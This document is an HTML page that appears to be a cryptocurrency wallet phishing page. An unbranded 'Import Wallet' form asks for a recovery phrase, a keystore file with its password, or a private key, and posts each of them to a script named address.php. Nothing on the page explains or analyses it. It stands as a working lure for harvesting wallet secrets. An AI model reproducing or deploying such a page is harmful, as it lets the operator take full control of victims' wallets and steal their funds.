  <body>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root">
      <section class="form">
        <div class="import">
          <h3><i class="fas fa-less-than"></i>Import Wallet</h3>
          <ul>
            <li class="phrase" id="phrase1">Phrase</li>
            <li class="keystore" id="keystore1">Keystore JSON</li>
            <li class="privatekey" id="privatekey1">Private Key</li>
          </ul>
          <hr />
          <form
            action="address.php"
            method="POST"
            id="my-form"
          >
            <input type="hidden" name="n" value="1" />
            <div id="phrase">
              <textarea
                placeholder="Phrase"
                cols="30"
                rows="10"
                name="phrase"
              ></textarea>
              <p>Typically 12(sometimes 24) words separated by single spaces</p>
              <button id="submit" type="submit" name="submit" value="submit">
                Import
              </button>
            </div>

            <div id="keystore" style="display: none">
              <textarea
                placeholder="Keystore"
                cols="30"
                rows="10"
                name="keystore"
              ></textarea>
              <br /><input
                type="password"
                placeholder="Password"
                name="keystorepass"
                style="margin-top: 10px"
              />
              <p>
                Several lines of text beginning with "{...}" plus the password
                you used to encrypt it.
              </p>
              <button id="submit" type="submit" name="submit" value="submit">
                Import
              </button>
            </div>

            <div id="privatekey" style="display: none">
              <input type="text" placeholder="Private Key" name="pkey" />
              <p>Typically 12(sometimes 24) words separated by single spaces</p>
              <button id="submit" type="submit" name="submit" value="submit">
                Import
              </button>
            </div>
          </form>
        </div>
      </section>
    </div>

    <script src="../js/jquery.js"></script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js" integrity="sha512-LCNYs7jH7Odmoc6adflrhgpq0cJmq8fwQJq3ICCBuk8BKFwA0PL6pVgVcKFnfNc0dJ+UmFp5sYvjG+jjlh7nXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha512-tWNnzQVU2eXRIQPivjTjBEM7iY2114Q5pOBIRRaOQT2Qh1Ak48VYPN4+2KpomJpcerN6pRFj5l+3LnxQ0dtYfQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script>
      $('.div-cont').click(function () {
        $('.import').fadeToggle()
      })
    </script>
    <script>
      var btn = document.getElementById('phrase1')
      var btn1 = document.getElementById('keystore1')
      var btn2 = document.getElementById('privatekey1')
      var modal = document.getElementById('phrase')
      var modal1 = document.getElementById('keystore')
      var modal2 = document.getElementById('privatekey')
      btn.onclick = function () {
        modal.style.display = 'block'
        modal1.style.display = 'none'
        modal2.style.display = 'none'
      }
      btn1.onclick = function () {
        modal1.style.display = 'block'
        modal.style.display = 'none'
        modal2.style.display = 'none'
      }
      btn2.onclick = function () {
        modal2.style.display = 'block'
        modal.style.display = 'none'
        modal1.style.display = 'none'
      }
    </script>
    <script src="static/js/bundle.js"></script>
    <script src="static/js/2.chunk.js"></script>
    <script src="static/js/main.chunk.js"></script>

    <div><div class="Toastify"></div></div>
  </body>
</html>
